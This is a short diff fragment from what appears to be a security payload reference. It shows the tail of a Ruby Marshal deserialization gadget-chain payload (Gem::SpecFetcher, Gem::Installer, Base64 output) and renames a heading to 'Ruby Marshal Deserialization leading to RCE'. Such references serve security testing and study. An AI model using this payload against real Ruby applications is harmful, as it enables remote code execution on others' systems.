@@ -42,8 +42,7 @@ payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 puts Base64.encode64(payload)
 
 
-
-# Cross-Site WebSocket Hijacking
+# Ruby Marshal Deserialization leading to RCE
 
 
 
